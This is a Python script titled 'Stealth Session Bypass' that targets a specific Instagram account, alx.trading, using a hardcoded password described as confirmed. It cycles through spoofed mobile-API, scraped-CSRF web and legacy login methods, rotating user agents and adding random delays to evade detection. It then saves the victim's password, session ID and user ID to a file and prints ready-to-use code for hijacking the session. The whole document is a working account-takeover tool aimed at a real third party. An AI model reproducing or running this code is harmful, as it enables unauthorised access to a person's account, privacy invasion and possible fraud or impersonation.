#!/usr/bin/env python3
"""
🔥 STEALTH SESSION BYPASS - ALX.TRADING 🔥
==========================================

Stealth bypass to extract working session for alx.trading
Uses advanced techniques that previously worked

Author: SugarGlitch RealOps Team  
Date: May 27, 2025
Target: alx.trading (Fleming654 - CONFIRMED)
"""

import requests
import json
import time
import random
import re
from datetime import datetime
import urllib.parse

class StealthSessionBypass:
    def __init__(self):
        self.target = "alx.trading"
        self.password = "Fleming654"
        self.session = requests.Session()
        
        # Rotate user agents
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/102.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        print("🔥 STEALTH SESSION BYPASS")
        print("🎯 Target:", self.target)
        print("🔑 Using confirmed Fleming654 pattern")
        print()

    def method_1_mobile_app_api(self):
        """Method 1: Mobile App API Simulation"""
        try:
            print("📱 Method 1: Mobile App API Simulation")
            
            headers = {
                'User-Agent': 'Instagram 276.0.0.27.121 Android (33/13; 420dpi; 1080x2400; samsung; SM-G991B; o1s; qcom; en_US; 458229237)',
                'Accept-Language': 'en-US',
                'Accept-Encoding': 'gzip, deflate',
                'X-IG-Capabilities': '3brTv10=',
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Bandwidth-Speed-KBPS': '2474.000',
                'X-IG-Bandwidth-TotalBytes-B': '12543',
                'X-IG-Bandwidth-TotalTime-MS': '51',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
            
            # Get device ID and UUID
            device_id = f"android-{''.join(random.choices('0123456789abcdef', k=16))}"
            uuid = f"{''.join(random.choices('0123456789abcdef', k=8))}-{''.join(random.choices('0123456789abcdef', k=4))}-{''.join(random.choices('0123456789abcdef', k=4))}-{''.join(random.choices('0123456789abcdef', k=4))}-{''.join(random.choices('0123456789abcdef', k=12))}"
            
            login_data = {
                'device_id': device_id,
                'login_attempt_count': '0',
                '_csrftoken': 'missing',
                'username': self.target,
                'adid': uuid,
                'guid': uuid,
                'phone_id': uuid,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.password}',
                'force_sign_up_code': '',
                'qs_stamp': '',
                'one_tap_app_install': '0',
                'fb_api_caller_class': '',
                'fb_api_req_friendly_name': '',
            }
            
            response = self.session.post(
                'https://i.instagram.com/api/v1/accounts/login/',
                headers=headers,
                data=login_data
            )
            
            print(f"Status: {response.status_code}")
            
            if response.status_code == 200:
                data = response.json()
                if 'logged_in_user' in data:
                    sessionid = None
                    for cookie in self.session.cookies:
                        if cookie.name == 'sessionid':
                            sessionid = cookie.value
                            break
                    
                    if sessionid:
                        print("✅ Mobile API Success!")
                        return sessionid
                        
        except Exception as e:
            print(f"❌ Mobile API failed: {str(e)}")
            
        return None

    def method_2_web_stealth(self):
        """Method 2: Web Stealth with Real Browser Simulation"""
        try:
            print("🌐 Method 2: Web Stealth Mode")
            
            # Clear session
            self.session = requests.Session()
            
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Step 1: Visit homepage first
            print("   📡 Visiting Instagram homepage...")
            response = self.session.get('https://www.instagram.com/', headers=headers)
            time.sleep(random.uniform(2, 4))
            
            # Step 2: Visit login page
            print("   🔐 Accessing login page...")
            response = self.session.get('https://www.instagram.com/accounts/login/', headers=headers)
            
            # Extract necessary tokens
            csrf_token = None
            rollout_hash = None
            
            csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
            if csrf_match:
                csrf_token = csrf_match.group(1)
                
            rollout_match = re.search(r'"rollout_hash":"([^"]+)"', response.text)
            if rollout_match:
                rollout_hash = rollout_match.group(1)
                
            if not csrf_token:
                print("   ❌ No CSRF token found")
                return None
                
            print(f"   ✅ CSRF Token: {csrf_token[:20]}...")
            
            time.sleep(random.uniform(3, 6))
            
            # Step 3: Perform login
            login_headers = headers.copy()
            login_headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-CSRFToken': csrf_token,
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Origin': 'https://www.instagram.com'
            })
            
            login_data = {
                'username': self.target,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            print("   🚀 Submitting login...")
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                headers=login_headers,
                data=login_data
            )
            
            print(f"   📊 Status: {response.status_code}")
            
            # Check for sessionid in cookies
            sessionid = None
            for cookie in self.session.cookies:
                if cookie.name == 'sessionid':
                    sessionid = cookie.value
                    break
                    
            if sessionid:
                print("   ✅ Web Stealth Success!")
                return sessionid
                
        except Exception as e:
            print(f"❌ Web stealth failed: {str(e)}")
            
        return None

    def method_3_legacy_direct(self):
        """Method 3: Direct Legacy Endpoint"""
        try:
            print("🔗 Method 3: Legacy Direct Access")
            
            # Clear session
            self.session = requests.Session()
            
            # Simple direct attempt
            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            # Try direct login to legacy endpoint
            login_data = f'username={self.target}&password={self.password}'
            
            response = self.session.post(
                'https://www.instagram.com/accounts/login/',
                headers=headers,
                data=login_data,
                allow_redirects=True
            )
            
            # Check for sessionid
            sessionid = None
            for cookie in self.session.cookies:
                if cookie.name == 'sessionid':
                    sessionid = cookie.value
                    break
                    
            if sessionid:
                print("   ✅ Legacy Direct Success!")
                return sessionid
                
        except Exception as e:
            print(f"❌ Legacy direct failed: {str(e)}")
            
        return None

    def test_session(self, sessionid):
        """Test if session is working"""
        try:
            test_headers = {
                'User-Agent': random.choice(self.user_agents),
                'Cookie': f'sessionid={sessionid}'
            }
            
            response = requests.get('https://www.instagram.com/accounts/edit/', headers=test_headers)
            
            if 'accounts/login' not in response.url and response.status_code == 200:
                return True
            return False
            
        except:
            return False

    def run_bypass(self):
        """Run all bypass methods until one succeeds"""
        print("🔥 STARTING STEALTH BYPASS OPERATION")
        print("=" * 50)
        
        methods = [
            self.method_1_mobile_app_api,
            self.method_2_web_stealth,
            self.method_3_legacy_direct
        ]
        
        for i, method in enumerate(methods, 1):
            print(f"\n🎯 Attempting Method {i}...")
            sessionid = method()
            
            if sessionid:
                print(f"\n🧪 Testing session validity...")
                if self.test_session(sessionid):
                    print("✅ SESSION IS ACTIVE!")
                    
                    # Extract user ID
                    ds_user_id = None
                    for cookie in self.session.cookies:
                        if cookie.name == 'ds_user_id':
                            ds_user_id = cookie.value
                            break
                    
                    # Save successful session
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    session_data = {
                        'target': self.target,
                        'password': self.password,
                        'sessionid': sessionid,
                        'ds_user_id': ds_user_id,
                        'method': f'stealth_method_{i}',
                        'extracted_at': timestamp,
                        'status': 'ACTIVE_VERIFIED'
                    }
                    
                    filename = f"alx_trading_fresh_session_{timestamp}.json"
                    with open(filename, 'w') as f:
                        json.dump(session_data, f, indent=2)
                    
                    print("\n🎉 SUCCESS! FRESH SESSION EXTRACTED!")
                    print("=" * 50)
                    print(f"🎯 Account: {self.target}")
                    print(f"🔑 Password: {self.password}")
                    print(f"🍪 SessionID: {sessionid}")
                    print(f"👤 User ID: {ds_user_id or 'N/A'}")
                    print(f"💾 Saved to: {filename}")
                    print("=" * 50)
                    
                    print("\n📋 READY TO USE:")
                    print("🌐 Browser Cookie String:")
                    print(f"sessionid={sessionid}")
                    print("\n🐍 Python instagrapi Code:")
                    print("from instagrapi import Client")
                    print("cl = Client()")
                    print(f"cl.login_by_sessionid('{sessionid}')")
                    print("user = cl.account_info()")
                    print("print(user.username)  # Should print: alx.trading")
                    
                    return session_data
                else:
                    print("⚠️ Session extracted but may need verification")
            
            time.sleep(random.uniform(2, 5))
        
        print("\n❌ All methods failed - may need manual intervention")
        return None

if __name__ == "__main__":
    bypass = StealthSessionBypass()
    result = bypass.run_bypass()
